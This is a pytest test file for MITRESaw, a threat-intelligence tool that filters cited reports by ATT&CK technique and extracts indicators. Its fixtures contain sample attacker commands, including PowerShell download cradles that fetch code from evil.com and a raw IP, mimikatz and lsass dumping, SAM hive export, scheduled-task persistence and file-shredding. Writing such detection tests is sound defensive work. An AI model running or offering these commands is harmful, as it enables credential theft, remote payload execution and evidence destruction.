"""
MITRESaw — Citation Workflow Review Tests
==========================================

Run with:  python -m pytest tests/test_citation_workflow.py -v -s

These are *inspection* tests, not just pass/fail.  The -s flag shows the
printed output so you can scrutinise what the pipeline extracts for each
group/technique combination.  Assertions are intentionally lightweight —
the main value is in reading the output.

Test groups:
  A) Relevance extraction — does the right text survive paragraph filtering?
  B) Indicator extraction — are the right commands / tools / paths found?
  C) Full pipeline — relevance → indicator extraction → dedup → classification
  D) Parametrized spot-checks — real ATT&CK group/technique pairs
  E) Edge cases — empty content, garbled PDF text, image-only stubs
"""

import json
import re
import textwrap
from pathlib import Path

import pytest

from src.citation_collector import (
    _extract_relevant_passages,
    extract_indicators_from_text,
    html_to_text,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _print_indicators(indicators: dict, label: str = "") -> None:
    if label:
        print(f"\n  {'─' * 60}")
        print(f"  {label}")
    if not indicators:
        print("    (no indicators extracted)")
        return
    for itype, vals in indicators.items():
        print(f"    [{itype:8s}]  {vals}")


def _print_passages(text: str, label: str = "", max_chars: int = 600) -> None:
    if label:
        print(f"\n  {'─' * 60}")
        print(f"  {label}")
    if not text:
        print("    (no relevant passages)")
        return
    preview = text[:max_chars].replace("\n", "\n    ")
    print(f"    {preview}" + ("..." if len(text) > max_chars else ""))


# ---------------------------------------------------------------------------
# A) Relevance extraction
# ---------------------------------------------------------------------------

class TestRelevanceExtraction:

    def test_t1124_system_time_discovery_windows(self):
        """T1124 — Windows: relevant paragraphs should mention time cmds or T1124.

        Note: the relevance filter scores on technique terms only. Paragraphs
        that contain the commands but NOT 'System Time Discovery' or 'T1124'
        are excluded — this is correct behaviour because MITRE already links
        the citation to the technique; we want technique-corroborating passages.
        Fixtures co-locate commands with the technique name, as real reports do.
        """
        text = textwrap.dedent("""\
            System Time Discovery (T1124) was performed using `net time \\\\dc01`
            to synchronise the implant clock with the domain controller. The
            `w32tm /query /status` command confirmed the Windows Time Service was
            reachable. `tzutil /g` identified the configured timezone before
            lateral movement began.

            This report also discusses general macOS networking APIs and Apple's
            NTP implementation for iOS devices, which is unrelated to the observed
            Windows campaign activity and does not involve T1124 on this platform.
        """)
        result = _extract_relevant_passages(text, "ZIRCONIUM", "System Time Discovery", "T1124")
        _print_passages(result, "T1124 Windows — relevant passages")

        assert "net time" in result or "w32tm" in result or "tzutil" in result
        assert "T1124" in result or "System Time Discovery" in result

    def test_t1124_system_time_discovery_linux(self):
        """T1124 — Linux: hwclock, timedatectl, date should surface."""
        text = textwrap.dedent("""\
            On compromised Linux hosts the implant ran hwclock --hctosys to sync
            the hardware clock, then timedatectl status to confirm the timezone.

            System Time Discovery (T1124) is used to avoid scheduling operations
            at unusual hours that might trigger alerts.

            The date command was also invoked with date +%s to retrieve the Unix
            epoch timestamp for use in beacon sleep calculations.

            ntpdate -q pool.ntp.org was seen querying external time sources.
            chronyc tracking was used on RHEL hosts.

            Unrelated section about database backup schedules.
        """)
        result = _extract_relevant_passages(text, "ZIRCONIUM", "System Time Discovery", "T1124")
        _print_passages(result, "T1124 Linux — relevant passages")

        assert "hwclock" in result or "timedatectl" in result or "T1124" in result

    def test_t1059_001_powershell(self):
        """T1059.001 — PowerShell: encoded commands and bypass flags should surface."""
        text = textwrap.dedent("""\
            APT29 executed a PowerShell script using powershell.exe -nop -w hidden
            -enc SQBFAFgA to avoid default execution policy restrictions.

            The Command and Scripting Interpreter: PowerShell (T1059.001) technique
            was observed in multiple intrusions attributed to this group.

            A separate base64-encoded payload was delivered via
            powershell -ExecutionPolicy Bypass -File C:\\Temp\\stage2.ps1.

            Unrelated paragraph about Python scripting on macOS for data analysis.

            Invoke-Expression (IEX) was used to execute remotely fetched code
            without writing to disk, a common fileless execution pattern.
        """)
        result = _extract_relevant_passages(text, "APT29", "PowerShell", "T1059.001")
        _print_passages(result, "T1059.001 PowerShell — relevant passages")

        assert "PowerShell" in result or "T1059.001" in result or "powershell" in result.lower()

    def test_t1003_credential_dumping(self):
        """T1003 — Credential dumping: mimikatz, lsass, sekurlsa should surface."""
        text = textwrap.dedent("""\
            The threat actor invoked sekurlsa::logonpasswords via mimikatz to dump
            credentials from lsass.exe memory on the compromised host.

            OS Credential Dumping (T1003) techniques were observed across multiple
            hosts following initial access.

            procdump64.exe -ma lsass.exe lsass.dmp was used to create a memory
            dump that was later exfiltrated for offline credential extraction.

            Unrelated section about cloud storage pricing tiers.

            HKLM\\SECURITY\\SAM was accessed using reg save hklm\\sam C:\\Temp\\sam
            as an alternative credential extraction technique.
        """)
        result = _extract_relevant_passages(text, "APT33", "OS Credential Dumping", "T1003")
        _print_passages(result, "T1003 Credential Dumping — relevant passages")

        assert "mimikatz" in result.lower() or "lsass" in result.lower() or "T1003" in result

    def test_t1053_scheduled_task(self):
        """T1053.005 — Scheduled Task: schtasks variations should surface."""
        text = textwrap.dedent("""\
            Persistence was achieved using schtasks /create /tn "WindowsUpdate"
            /tr C:\\Windows\\Temp\\updater.exe /sc daily /st 09:00.

            The Scheduled Task/Job: Scheduled Task (T1053.005) sub-technique was
            observed in conjunction with a base64-encoded PowerShell payload.

            An alternative mechanism used at /sc:once /st 00:00 to schedule a
            one-time execution at midnight.

            Unrelated paragraph about Linux crontab configuration for backup tasks.
        """)
        result = _extract_relevant_passages(
            text, "MuddyWater", "Scheduled Task", "T1053.005",
            indicators=["schtasks"]
        )
        _print_passages(result, "T1053.005 Scheduled Task — relevant passages")

        assert "schtasks" in result or "T1053.005" in result

    def test_low_signal_generic_page_scores_minimal(self):
        """A page with only peripheral time-related content should return little/nothing."""
        text = textwrap.dedent("""\
            Apple provides time synchronisation APIs for iOS and macOS developers.
            The NTPClient class handles network time protocol queries automatically.
            Developers should avoid relying on wall-clock time for security decisions.
            This is a general best-practice guide for mobile application developers.
            Network Time Protocol (NTP) uses UDP port 123 for time queries.
        """)
        result = _extract_relevant_passages(
            text, "ZIRCONIUM", "System Time Discovery", "T1124"
        )
        _print_passages(result, "Low-signal generic page — should be minimal/empty")
        # No T1124 or System Time Discovery appears — result should be empty
        assert result == ""

    def test_indicators_used_as_supplementary_signals(self):
        """Extracted indicators fed back in improve paragraph selection."""
        text = textwrap.dedent("""\
            The implant used net time to query the domain controller time.

            Completely unrelated paragraph about cooking techniques and recipes.

            The group ran timedatectl status to identify the target's timezone
            before scheduling exfiltration operations.

            Another unrelated paragraph about sports results and league tables.
        """)
        # With indicators, timedatectl paragraph should be found
        result_with = _extract_relevant_passages(
            text, "APT41", "System Time Discovery", "T1124",
            indicators=["timedatectl", "net time"]
        )
        result_without = _extract_relevant_passages(
            text, "APT41", "System Time Discovery", "T1124"
        )
        print(f"\n  With indicators:    {len(result_with)} chars returned")
        print(f"  Without indicators: {len(result_without)} chars returned")

        # Both should find something (T1124 phrase appears implicitly via technique name)
        # But with indicators, timedatectl paragraph should definitely be included
        assert "timedatectl" in result_with


# ---------------------------------------------------------------------------
# B) Indicator extraction from realistic citation text
# ---------------------------------------------------------------------------

class TestIndicatorExtraction:

    def test_windows_time_commands(self):
        """Single-word Windows time commands should be captured via known_commands."""
        text = textwrap.dedent("""\
            The actor queried time using several methods. First, `w32tm` was invoked
            to check the Windows Time Service status. Then `tzutil` confirmed the
            configured timezone. The legacy `net` command was also used.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "Windows time commands")

        cmds = [c.lower() for c in result.get("cmd", [])]
        assert "w32tm" in cmds or "tzutil" in cmds or "net" in cmds

    def test_linux_time_commands(self):
        """Linux single-word time commands must be captured via known_commands YAML."""
        text = textwrap.dedent("""\
            On the compromised Linux server, the attacker ran `hwclock` to read the
            hardware real-time clock. The `timedatectl` utility confirmed NTP sync
            status. Raw time was obtained with `date` and epoch seconds via
            `date +%s`. The `ntpdate` command queried external time servers.
            `chronyc tracking` was also observed on RHEL-based systems.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "Linux time commands")

        cmds = [c.lower() for c in result.get("cmd", [])]
        assert "hwclock" in cmds,     "hwclock should be captured as cmd"
        assert "timedatectl" in cmds, "timedatectl should be captured as cmd"
        assert "date" in cmds,        "date should be captured as cmd"

    def test_macos_time_commands(self):
        """macOS time commands should be captured."""
        text = textwrap.dedent("""\
            On macOS hosts `systemsetup -gettimezone` revealed the timezone.
            The attacker used `sntp` to query Apple's time servers directly.
            `date` returned the current time in the default locale format.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "macOS time commands")

        cmds = [c.lower() for c in result.get("cmd", [])]
        assert "date" in cmds or "sntp" in cmds

    def test_powershell_variants(self):
        """Multi-word PowerShell invocations should be captured as cmd."""
        text = textwrap.dedent("""\
            The group executed `powershell -nop -w hidden -enc SQBFAFgA` to run
            a base64-encoded payload. They also used
            `powershell -ExecutionPolicy Bypass -File stage2.ps1` for a staged
            execution. Invoke-Expression was called as `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')`.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "PowerShell variants")

        cmds = [c.lower() for c in result.get("cmd", [])]
        assert any("powershell" in c for c in cmds)

    def test_credential_dumping_tools(self):
        """Known offensive tools in backticks classified as software."""
        text = textwrap.dedent("""\
            Credential dumping was performed using `mimikatz` with the
            sekurlsa::logonpasswords command. The attacker also deployed `rubeus`
            for Kerberoasting. `procdump` created a memory dump of lsass.exe.
            `pypykatz` was used as a Python-based alternative on some hosts.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "Credential dumping tools")

        sw = [s.lower() for s in result.get("software", [])]
        assert "mimikatz" in sw, "mimikatz should be classified as software"
        assert "rubeus" in sw,   "rubeus should be classified as software"

    def test_registry_persistence(self):
        """Registry run keys should be captured regardless of backtick format."""
        text = textwrap.dedent("""\
            The implant added a run key at
            HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsHelper
            pointing to the dropped executable.

            The actor also modified
            `HKLM\\SYSTEM\\CurrentControlSet\\Services\\malservice` to establish
            a malicious service.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "Registry persistence")

        regs = [r.lower() for r in result.get("reg", [])]
        assert any("hkcu" in r or "hklm" in r for r in regs)

    def test_file_paths_windows_and_unix(self):
        """Windows and Unix file paths should be captured."""
        text = textwrap.dedent("""\
            The payload was dropped to `C:\\Windows\\Temp\\svchost32.exe` and
            executed from there. A second copy was placed at
            C:\\ProgramData\\Microsoft\\update.dll for persistence.

            On Linux hosts the backdoor was installed at /tmp/.systemd-private/
            and launched via a service unit file at /etc/systemd/system/sshd-monitor.service.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "File paths — Windows and Unix")

        paths = result.get("paths", []) + result.get("filepath", [])
        assert any("Windows" in p or "windows" in p.lower() or "/tmp" in p or "/etc" in p
                   for p in paths)

    def test_cve_extraction(self):
        """CVE IDs should be captured correctly."""
        text = textwrap.dedent("""\
            The actor exploited CVE-2021-34527 (PrintNightmare) to escalate
            privileges on Windows print servers. CVE-2020-1472 (Zerologon) was
            also used to compromise domain controllers without authentication.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "CVE extraction")

        cves = result.get("cve", [])
        assert "CVE-2021-34527" in cves
        assert "CVE-2020-1472" in cves

    def test_port_extraction_from_c2_context(self):
        """Port numbers mentioned in C2 context should be captured."""
        text = textwrap.dedent("""\
            The implant beaconed over TCP/443 to the C2 infrastructure.
            A secondary channel used port 8080 for data exfiltration.
            Lateral movement traffic was observed on port 445 (SMB) and
            the attacker's pivot host was listening on TCP/4444.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "Port extraction")

        ports = result.get("ports", [])
        assert "443" in ports or "8080" in ports or "4444" in ports

    def test_no_false_positives_from_prose(self):
        """Prose fragments should not be classified as commands."""
        text = textwrap.dedent("""\
            The `such as` the group used `can be used` to perform actions
            `where the` adversary `information about` target systems.
            Common prose that leaks into backtick scanning `the type of`
            access available `for example` on Windows hosts.
        """)
        result = extract_indicators_from_text(text)
        _print_indicators(result, "False positive prose check")

        cmds = result.get("cmd", [])
        prose_phrases = ["such as", "can be used", "where the",
                         "information about", "the type of", "for example"]
        for phrase in prose_phrases:
            assert phrase not in cmds, f"Prose fragment '{phrase}' should not be a cmd indicator"

    def test_garbled_pdf_text_rejected(self):
        """Garbled/binary text from bad PDF extraction should return no indicators."""
        garbled = (
            "ÿþ\x00A\x00P\x00T\x002\x009\x00 "
            "\x00u\x00s\x00e\x00d\x00 "
            "ôöøùúûü¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆ"
        ) * 20
        result = extract_indicators_from_text(garbled)
        _print_indicators(result, "Garbled PDF text — should be empty")
        assert result == {}


# ---------------------------------------------------------------------------
# C) Full pipeline: relevance → indicator extraction
# ---------------------------------------------------------------------------

class TestFullPipeline:

    def _run_pipeline(
        self,
        raw_text: str,
        technique_name: str,
        technique_id: str,
        indicators: list | None = None,
        label: str = "",
    ) -> dict:
        """Simulate what happens when a citation page is fetched for a technique."""
        # Step 1 — filter to relevant passages
        relevant = _extract_relevant_passages(
            raw_text, "", technique_name, technique_id, indicators
        )
        # Step 2 — extract indicators from those passages
        extracted = extract_indicators_from_text(relevant) if relevant else {}
        # Step 3 — output for inspection
        print(f"\n  {'═' * 60}")
        print(f"  Pipeline: {technique_id} — {technique_name}")
        if label:
            print(f"  Source: {label}")
        print(f"  Input:    {len(raw_text):,} chars → {len(relevant):,} chars after relevance filter")
        _print_indicators(extracted)
        return extracted

    def test_pipeline_t1124_linux_report(self):
        """Full pipeline for a realistic Linux threat report covering T1124.

        Key design note: commands must appear in the same paragraph as a
        technique-identifying term ('System Time Discovery' or 'T1124') to
        survive the relevance filter. Real threat reports typically do this
        naturally ('T1124 was observed via hwclock...'). Fixtures reflect that.
        """
        report = textwrap.dedent("""\
            Executive Summary
            =================
            This report covers a Linux-targeted campaign where the threat actor
            demonstrated awareness of host timekeeping to synchronise implant
            callbacks with business hours.

            Technical Analysis — System Time Discovery (T1124)
            ===================================================
            System Time Discovery (T1124) activity was observed across multiple
            hosts. The actor used `hwclock --show` to read the hardware RTC,
            then `timedatectl` to confirm NTP synchronisation status. Raw time
            was obtained with `date +%Z`, and `ntpdate -q 0.pool.ntp.org`
            verified external NTP reachability. All consistent with T1124.

            The implant calculated sleep duration based on business hours before
            attempting outbound connections, reinforcing the T1124 motivation.

            Infrastructure
            ==============
            C2 traffic used port 443 and port 8443 with TLS certificate pinning.
            Fallback used port 80 over HTTP.

            Appendix: Unrelated macOS Developer Notes
            ==========================================
            Apple provides APIs for system time queries on macOS and iOS.
            This section is not relevant to the Linux campaign described above.
        """)

        extracted = self._run_pipeline(
            report,
            "System Time Discovery", "T1124",
            label="Realistic Linux T1124 report"
        )

        cmds = [c.lower() for c in extracted.get("cmd", [])]
        assert "hwclock" in cmds or "timedatectl" in cmds or "date" in cmds, \
            "At least one Linux time command should be extracted"

    def test_pipeline_t1059_001_report(self):
        """Full pipeline for a PowerShell-heavy threat report."""
        report = textwrap.dedent("""\
            Threat Overview
            ===============
            The actor used Command and Scripting Interpreter: PowerShell (T1059.001)
            extensively throughout the intrusion lifecycle.

            Initial Access
            ==============
            A macro-laden document spawned powershell.exe with the following:
            `powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj`

            Execution
            =========
            The encoded payload decoded to an IEX download cradle:
            `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/stager')`

            Persistence was established via:
            `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\update.ps1`

            Credential Dumping
            ==================
            `mimikatz` was executed inline via Invoke-Mimikatz (PowerSploit module).
            `rubeus.exe kerberoast /format:hashcat` was also observed.

            Exfiltration
            ============
            Data was compressed with `Compress-Archive -Path C:\\loot -DestinationPath C:\\Temp\\out.zip`
            and sent over TCP/443 to the C2 infrastructure.
        """)

        extracted = self._run_pipeline(
            report,
            "PowerShell", "T1059.001",
            label="Realistic PowerShell intrusion report"
        )

        cmds = [c.lower() for c in extracted.get("cmd", [])]
        sw = [s.lower() for s in extracted.get("software", [])]
        assert any("powershell" in c for c in cmds), "PowerShell command should be extracted"
        # Note: mimikatz/rubeus appear in the 'Credential Dumping' section which
        # doesn't mention 'PowerShell' or 'T1059.001', so the relevance filter
        # correctly excludes those paragraphs when scoring for T1059.001.
        # They WOULD be captured if this citation were fetched for T1003 instead.
        print(f"\n  (software found: {sw} — credential tools excluded by T1059.001 relevance filter)")

    def test_pipeline_noisy_report_with_irrelevant_sections(self):
        """A report with lots of off-topic content — relevant bits should still surface."""
        report = textwrap.dedent("""\
            Introduction
            ============
            This advisory covers multiple unrelated topics. Most content is not
            relevant to the technique being searched.

            Cloud Infrastructure Guidance
            ==============================
            AWS S3 bucket policies should restrict access using IAM roles.
            Azure Key Vault provides secrets management for cloud workloads.
            Google Cloud IAM lets administrators manage access at the project level.

            Threat Actor Activity — System Time Discovery (T1124)
            =====================================================
            HAFNIUM queried domain controller time using `net time \\\\dc01.contoso.com`
            to ensure implant scheduling aligned with business hours. The T1124
            technique was observed on 14 separate hosts during the intrusion.

            `w32tm /query /status` was also captured in process telemetry
            confirming the adversary's interest in time synchronisation.

            Patch Management Best Practices
            ================================
            Organisations should prioritise patching based on CVSS score.
            CVE scoring uses a 0-10 scale. Critical patches (CVSS > 9) should
            be applied within 72 hours of disclosure.

            Conclusion
            ==========
            Security teams should monitor for unusual time-query behaviour.
        """)

        extracted = self._run_pipeline(
            report,
            "System Time Discovery", "T1124",
            indicators=["net time", "w32tm"],
            label="Noisy report — relevant section should surface"
        )

        cmds = [c.lower() for c in extracted.get("cmd", [])]
        assert any("net time" in c or "w32tm" in c for c in cmds), \
            "Time commands should be extracted despite surrounding noise"


# ---------------------------------------------------------------------------
# D) Parametrized spot-checks — real ATT&CK pairs
# ---------------------------------------------------------------------------

TECHNIQUE_FIXTURES = [
    pytest.param(
        "T1124", "System Time Discovery",
        # Representative text
        textwrap.dedent("""\
            System Time Discovery (T1124): adversaries query the system clock
            to avoid scheduling during hours that trigger anomaly detection.
            `hwclock`, `timedatectl`, `date`, `w32tm`, `net time` are all
            observed in campaigns targeting Windows and Linux systems.
        """),
        # Expected cmd indicators
        ["hwclock", "timedatectl", "date", "w32tm"],
        id="T1124-System-Time-Discovery",
    ),
    pytest.param(
        "T1059.001", "PowerShell",
        textwrap.dedent("""\
            T1059.001 PowerShell: the actor used `powershell -enc BASE64` and
            `powershell -nop -w hidden` to execute payloads. Encoded commands
            avoid default execution policy. `IEX` was used as a download cradle.
        """),
        ["powershell -enc base64", "powershell -nop -w hidden"],
        id="T1059.001-PowerShell",
    ),
    pytest.param(
        "T1082", "System Information Discovery",
        textwrap.dedent("""\
            System Information Discovery (T1082): `systeminfo` dumped host details
            on Windows. `uname -a` and `hostname` were used on Linux hosts.
            `wmic computersystem get` was also captured in EDR telemetry.
        """),
        ["systeminfo", "uname -a", "hostname"],
        id="T1082-System-Information-Discovery",
    ),
    pytest.param(
        "T1053.005", "Scheduled Task",
        textwrap.dedent("""\
            Scheduled Task (T1053.005): persistence via
            `schtasks /create /tn WindowsUpdate /tr C:\\Temp\\update.exe /sc daily`.
            Legacy `at` command was also observed on older Windows Server targets.
        """),
        ["schtasks /create"],
        id="T1053.005-Scheduled-Task",
    ),
    pytest.param(
        "T1003", "OS Credential Dumping",
        textwrap.dedent("""\
            OS Credential Dumping (T1003): `mimikatz` with sekurlsa::logonpasswords
            dumped LSASS memory. `procdump -ma lsass.exe` created a dump file.
            `rubeus` performed Kerberoasting. Registry: HKLM\\SECURITY\\SAM was saved.
        """),
        ["mimikatz"],
        id="T1003-Credential-Dumping",
    ),
    pytest.param(
        "T1021.002", "SMB/Windows Admin Shares",
        textwrap.dedent("""\
            Remote Services: SMB/Windows Admin Shares (T1021.002): lateral movement
            via `net use \\\\target\\C$ /user:domain\\admin password` to mount shares.
            `copy payload.exe \\\\target\\C$\\Windows\\Temp\\` staged the tool remotely.
            PsExec was used via `psexec \\\\target -u domain\\admin cmd.exe`.
        """),
        ["net use"],
        id="T1021.002-SMB-Admin-Shares",
    ),
    pytest.param(
        "T1070.004", "File Deletion",
        textwrap.dedent("""\
            Indicator Removal: File Deletion (T1070.004): the actor removed
            artefacts using `del /f /q C:\\Windows\\Temp\\payload.exe` and
            `rm -rf /tmp/.cache/` on Linux. `shred -u /tmp/exfil.tar.gz` was
            observed on hardened hosts.
        """),
        ["del /f /q c:\\windows\\temp\\payload.exe"],
        id="T1070.004-File-Deletion",
    ),
    pytest.param(
        "T1016", "System Network Configuration Discovery",
        textwrap.dedent("""\
            System Network Configuration Discovery (T1016): `ipconfig /all` on
            Windows and `ifconfig`, `ip addr show`, `netstat -rn` on Linux/macOS
            were used to enumerate interfaces, routes, and active connections.
            `arp -a` revealed adjacent hosts on the local subnet.
        """),
        ["ipconfig /all", "ifconfig"],
        id="T1016-Network-Config-Discovery",
    ),
]


@pytest.mark.parametrize("technique_id,technique_name,text,expected_cmds", TECHNIQUE_FIXTURES)
def test_parametrized_technique_pipeline(technique_id, technique_name, text, expected_cmds):
    """Run full relevance → extraction pipeline for each technique fixture."""
    print(f"\n\n  {'═' * 60}")
    print(f"  {technique_id} — {technique_name}")

    relevant = _extract_relevant_passages(text, "", technique_name, technique_id)
    extracted = extract_indicators_from_text(relevant) if relevant else {}

    print(f"  Relevance: {len(text):,} → {len(relevant):,} chars")
    _print_indicators(extracted)

    all_found = []
    for itype, vals in extracted.items():
        all_found.extend(v.lower() for v in vals)

    missing = []
    for expected in expected_cmds:
        if not any(expected.lower() in found for found in all_found):
            missing.append(expected)

    if missing:
        print(f"\n  ⚠ Missing expected indicators: {missing}")
    else:
        print(f"\n  ✓ All expected indicators found")

    assert not missing, (
        f"Expected indicators not extracted for {technique_id}: {missing}\n"
        f"Extracted: {all_found}"
    )


# ---------------------------------------------------------------------------
# E) Edge cases
# ---------------------------------------------------------------------------

class TestEdgeCases:

    def test_empty_text_returns_empty(self):
        result = _extract_relevant_passages("", "APT29", "PowerShell", "T1059.001")
        assert result == ""
        extracted = extract_indicators_from_text("")
        assert extracted == {}

    def test_very_short_text_below_threshold(self):
        """Text under 50 chars should not be processed."""
        result = extract_indicators_from_text("short")
        assert result == {}

    def test_no_technique_terms_returns_head(self):
        """When no technique terms are provided, return the head of the text."""
        text = "A" * 10000
        result = _extract_relevant_passages(text, "APT29", "", "")
        assert len(result) <= 4000  # MAX_RELEVANT_CHARS

    def test_stix_metadata_fallback_text(self):
        """STIX description metadata (author, title, date) used as fallback."""
        stix_desc = "FireEye. (2020). APT29 Targets COVID-19 Vaccine Research. Retrieved October 2020."
        # Simulate the STIX fallback — this is plain text, no backticks
        result = extract_indicators_from_text(stix_desc)
        _print_indicators(result, "STIX metadata — should be minimal/empty")
        # STIX descriptions are mostly prose — we don't expect meaningful indicators
        # but extraction shouldn't crash
        assert isinstance(result, dict)

    def test_html_page_strips_script_and_style(self):
        """HTML from fetched pages strips scripts and style blocks before extraction."""
        html = textwrap.dedent("""\
            <html><head>
            <style>body { color: red; } .cmd { font-family: mono; }</style>
            <script>var cmd = 'powershell -enc evil'; doSomething(cmd);</script>
            </head><body>
            <h1>Threat Report</h1>
            <p>The attacker used <code>powershell -nop -enc SQBFAFgA</code> to execute payloads.</p>
            <p>Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> was modified.</p>
            <script>analytics.track('page_view');</script>
            </body></html>
        """)
        text = html_to_text(html)

        # Script content should not appear
        assert "doSomething" not in text
        assert "analytics.track" not in text

        # Report content should survive
        assert "powershell" in text.lower() or "Threat Report" in text

        extracted = extract_indicators_from_text(text)
        _print_indicators(extracted, "HTML stripped → indicators")

    def test_cached_content_pipeline(self):
        """If citation cache contains entries, run pipeline on first 3 and report."""
        cache_dirs = [Path("data/.citation_cache"), Path(".citation_cache")]
        cache_dir = next((d for d in cache_dirs if d.exists()), None)

        if not cache_dir:
            pytest.skip("No citation cache found — run MITRESaw with -C first")

        files = list(cache_dir.glob("*.json"))[:3]
        if not files:
            pytest.skip("Citation cache is empty")

        print(f"\n  Inspecting {len(files)} cached citation(s):")
        for f in files:
            try:
                data = json.loads(f.read_text())
                url = data.get("url", f.name)
                text = data.get("text", "")
                method = data.get("method", "unknown")
                print(f"\n  URL:    {url[:80]}")
                print(f"  Method: {method}")
                print(f"  Length: {len(text):,} chars")

                if text:
                    extracted = extract_indicators_from_text(text)
                    _print_indicators(extracted)
                else:
                    print("    (no text content)")
            except Exception as e:
                print(f"    Error reading {f.name}: {e}")
